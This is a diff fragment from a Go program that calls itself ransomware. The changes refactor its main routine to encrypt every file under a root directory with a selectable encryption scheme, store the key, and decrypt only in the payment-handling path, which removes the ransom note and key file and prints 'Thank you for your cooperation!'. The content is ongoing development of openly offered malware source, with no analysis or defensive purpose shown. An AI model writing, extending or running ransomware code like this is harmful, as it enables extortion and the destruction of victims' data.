@@ -38,8 +38,8 @@ func handleDecryptionProcess(rw *ransomware.Ransomware) {
 		rw.RemoveRansomFile()
 		rw.RemoveKeyFile()
 
-		if err := crypt.DecryptRoot(rw.RootDir, rw.MemguardKey); err != nil {
-			log.Fatalf("error decrypting all files: %s", err)
+		if err := crypt.DecryptRootWithScheme(rw.RootDir, encryptionScheme, rw.MemguardKey); err != nil {
+			log.Fatalf("error decrypting files, err: %s", err)
 		}
 
 		fmt.Println("Thank you for your cooperation!")
@@ -69,7 +69,10 @@ func main() {
 		handleDecryptionProcess(rw)
 	}
 
-	crypt.EncryptRoot(rw.RootDir, rw.MemguardKey)
+	if err := crypt.EncryptRootWithScheme(rw.RootDir, encryptionScheme, rw.MemguardKey); err != nil {
+		log.Fatalf("error while encrypting files, err: %s", err)
+	}
+
 	if err := rw.WriteMemSafeKey(); err != nil {
 		log.Fatal(err)
 	}
@@ -95,8 +98,8 @@ func main() {
 			rw.RemoveRansomFile()
 			rw.RemoveKeyFile()
 
-			if err := crypt.DecryptRoot(rw.RootDir, rw.MemguardKey); err != nil {
-				log.Fatalf("error decrypting all files: %s", err)
+			if err := crypt.DecryptRootWithScheme(rw.RootDir, encryptionScheme, rw.MemguardKey); err != nil {
+				log.Fatalf("error decrypting files, err: %s", err)
 			}
 
 			fmt.Println("Thank you for your cooperation!")
